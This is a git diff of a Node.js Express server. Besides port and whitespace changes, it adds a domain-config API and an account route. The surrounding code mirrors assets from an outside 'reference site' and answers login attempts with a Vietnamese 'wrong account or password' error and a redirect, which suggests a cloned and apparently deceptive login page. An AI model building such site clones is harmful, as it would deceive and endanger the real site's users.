@@ -14,8 +14,8 @@ const {
 const adminRoutes = require('./routes/admin');
 
 const app = express();
-const PORT = process.env.PORT || 3000;
-const HOST = process.env.HOST || '0.0.0.0';
+const PORT = process.env.PORT || 3004;
+const HOST = process.env.HOST || 'localhost';
 
 // Session setup
 app.use(
@@ -48,21 +48,21 @@ app.use(express.static(path.join(__dirname, 'public')));
 // Middleware to proxy and cache missing static assets dynamically from the reference site
 app.use((req, res, next) => {
   if (req.method !== 'GET') return next();
-  
-  const isAsset = /\.(png|jpe?g|gif|svg|ico|webp|css|js|woff2?|ttf|otf|mp3|mp4)$/i.test(req.path) || 
-                  req.path.startsWith('/img.alltocon.com/') || 
-                  req.path.startsWith('/img.alltocon.com');
-                  
+
+  const isAsset = /\.(png|jpe?g|gif|svg|ico|webp|css|js|woff2?|ttf|otf|mp3|mp4)$/i.test(req.path) ||
+    req.path.startsWith('/img.alltocon.com/') ||
+    req.path.startsWith('/img.alltocon.com');
+
   if (!isAsset) return next();
-  
+
   const fs = require('fs');
   const https = require('https');
-  
+
   const localPath = path.join(__dirname, 'public', req.path);
   if (fs.existsSync(localPath)) {
     return next();
   }
-  
+
   let remoteUrl = '';
   if (req.path.startsWith('/img.alltocon.com/')) {
     remoteUrl = `https:/${req.path}`;
@@ -71,14 +71,14 @@ app.use((req, res, next) => {
   } else {
     remoteUrl = `https://www.t12026ga6789.com${req.path}`;
   }
-  
+
   const cleanPath = localPath.split('?')[0];
   const dir = path.dirname(cleanPath);
-  
+
   if (!fs.existsSync(dir)) {
     fs.mkdirSync(dir, { recursive: true });
   }
-  
+
   const fileStream = fs.createWriteStream(cleanPath);
   https.get(remoteUrl, (response) => {
     if (response.statusCode === 200) {
@@ -104,7 +104,7 @@ app.use((req, res, next) => {
 app.use((req, res, next) => {
   const ua = req.headers['user-agent'] || '';
   const isMobile = /mobile|android|iphone|ipad|phone/i.test(ua) || req.query.device === 'mobile' || req.query.mobile === 'true';
-  
+
   const originalRender = res.render;
   res.render = function (view, options, callback) {
     if (isMobile && typeof view === 'string' && !view.startsWith('admin/')) {
@@ -221,8 +221,8 @@ const handleApiResponse = async (req, res, actionType) => {
 
       const { loginDomain, redirectDomain } = req.app.locals.domainConfig;
       return res.json({
-        Error: { 
-          Code: 1002, 
+        Error: {
+          Code: 1002,
           Message: 'Tài khoản hoặc mật khẩu sai',
           Redirect: loginDomain || redirectDomain || '/'
         },
@@ -256,6 +256,19 @@ app.get('/signup', (req, res) => {
 app.get('/login', (req, res) => {
   res.render('login');
 });
+
+// Public Domain Config API
+app.get('/api/config/domains', (req, res) => {
+  res.json(app.locals.domainConfig || {});
+});
+
+// Account / CSKH route
+app.get('/account', (req, res) => {
+  res.render('account');
+});
+
+
+
 
 
 // Lobby routes
